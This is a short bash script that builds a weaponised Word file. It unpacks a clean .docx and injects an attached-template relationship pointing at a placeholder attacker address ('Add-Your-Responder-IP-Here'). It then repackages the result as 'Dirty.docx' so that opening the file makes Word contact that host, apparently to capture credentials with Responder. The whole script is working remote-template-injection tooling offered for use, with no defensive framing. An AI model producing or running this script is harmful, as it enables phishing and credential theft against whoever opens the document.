#!/bin/bash
read -p "Feed it your clean word doc file:" Feed
mkdir /root/Desktop/emailscript/
cp $Feed /root/Desktop/emailscript/Clean.docx
cd /root/Desktop/emailscript/
mkdir /root/Desktop/emailscript/payload
unzip Clean.docx -d /root/Desktop/emailscript/payload
cd payload/word/
echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14"><w:zoom w:percent="100"/><w:attachedTemplate r:id="rId1"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="14"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/></w:compat><w:rsids><w:rsidRoot w:val="009E6CA3"/><w:rsid w:val="00666703"/><w:rsid w:val="009E6CA3"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-US"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="1026"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/></w:settings>' > settings.xml
cd _rels
echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"> <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://Add-Your-Responder-IP-Here/docs1" TargetMode="External"/> </Relationships>' > settings.xml.rels
cd /root/Desktop/emailscript/payload
zip -r mydocuments *
cd /root/Desktop/emailscript/payload
mv mydocuments.zip Dirty.docx
mv Dirty.docx /root/Desktop/
cd /root/Desktop/
rm -r /root/Desktop/emailscript/
RED='\033[0;31m'
printf "Your file is ready ${RED}/root/Desktop/Dirty.docx\n"
